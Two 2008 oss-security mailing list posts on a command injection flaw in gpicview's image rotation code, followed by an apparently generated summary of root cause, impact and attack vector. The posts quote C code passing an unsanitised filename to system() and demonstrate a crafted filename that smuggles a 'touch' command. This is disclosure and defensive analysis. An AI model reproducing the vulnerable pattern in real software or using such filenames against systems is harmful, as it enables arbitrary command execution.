```
Message-ID: <200809030200.05035.rbu@gentoo.org>
Date: Wed, 3 Sep 2008 01:59:47 +0200
From: Robert Buchholz <rbu@...too.org>
To: oss-security@...ts.openwall.com
Subject: Re: CVE Request (gpicview)

On Sunday 31 August 2008, Nico Golde wrote:
> Same piece of code main-win.c doesn't look too trustworthy
> to me either:
>
>     690     int error = jpegtran (filename, "/tmp/rot.jpg" , code);
>     691     if(error)
>     692         return error;
>     693
>     694     //now copy /tmp/rot.jpg back to the original file
>     695     char command[strlen(filename)+50]; //this should not
> generate buffer owerflow 696     // MS: didn't know, how to make it
> better, maybe an own copy routine 697     sprintf(command,"cp
> /tmp/rot.jpg \"%s\"",filename); 698     system(command);
>
> Anyone played with crafted file names?

Good catch! You need to append '.jpg' at the end of the crafed filename
so the rotation via jpegtran is invoked, but besides that it works ok:

rbu@...nut ~/devel/gentoo/security/gpicview $ ls -l
total 484K
-rw-------  1 rbu rbu 469K 2008-09-03 01:35 bla.jpg"; touch XX ;".jpg

rbu@...nut ~/devel/gentoo/security/gpicview $ gpicview *
QSettings: failed to open file '/usr/qt/3/etc/settings/qt_plugins_3.3rc'
sh: .jpg: command not found
^C

rbu@...nut ~/devel/gentoo/security/gpicview $ ls -l
total 960K
-rw-------  1 rbu rbu 469K 2008-09-03 01:52 bla.jpg
-rw-------  1 rbu rbu 469K 2008-09-03 01:35 bla.jpg"; touch XX ;".jpg
-rw-------  1 rbu rbu    0 2008-09-03 01:52 XX

Robert
```
```
Message-ID: <20080830234625.GC12017@ngolde.de>
Date: Sun, 31 Aug 2008 01:46:25 +0200
From: Nico Golde <oss-security+ml@...lde.de>
To: oss-security@...ts.openwall.com
Subject: Re: CVE Request (gpicview)

Hi Jan,
* Jan Lieskovsky <jlieskov@...hat.com> [2008-08-25 13:06]:
>   could you please allocate a CVE id for the following
> three gpicview issues:
>
> 1,
>
> <http://sourceforge.net/tracker/index.php?func=detail&aid=2019481&group_id=180858&atid=894869>
>
> Possible symlink attack via the temporary created "/tmp/rot.jpg"
> file used for image rotation.
[...]
Same piece of code main-win.c doesn't look too trustworthy
to me either:

    690     int error = jpegtran (filename, "/tmp/rot.jpg" , code);
    691     if(error)
    692         return error;
    693
    694     //now copy /tmp/rot.jpg back to the original file
    695     char command[strlen(filename)+50]; //this should not generate buffer owerflow
    696     // MS: didn't know, how to make it better, maybe an own copy routine
    697     sprintf(command,"cp /tmp/rot.jpg \"%s\"",filename);
    698     system(command);

Anyone played with crafted file names?
Cheers
Nico
```

Based on the provided content:

**Root cause of vulnerability:**
The `gpicview` application uses `sprintf` and `system` to copy a temporary file back to the original file after processing. The filename is inserted into the command string without proper sanitization, allowing for command injection.

**Weaknesses/vulnerabilities present:**
- Command injection: The program uses `sprintf` to build a shell command and then executes it with `system`. A crafted filename can inject shell commands by using characters like `";"`.
- Insecure use of `system`: Directly using `system` with a command constructed from user-controlled data is inherently insecure.

**Impact of exploitation:**
- Arbitrary code execution: An attacker can execute arbitrary shell commands with the privileges of the user running `gpicview`. In the provided example `touch XX` was executed creating a new empty file named XX.

**Attack vectors:**
- Crafted filenames: By creating a file with a malicious filename containing shell metacharacters, an attacker can inject and execute arbitrary commands. The file needs a ".jpg" extension so that the rotation function is called.

**Required attacker capabilities/position:**
- Ability to create files: The attacker must be able to create a file with a crafted name on the filesystem which is then opened by `gpicview`. The user must then open the file in `gpicview`.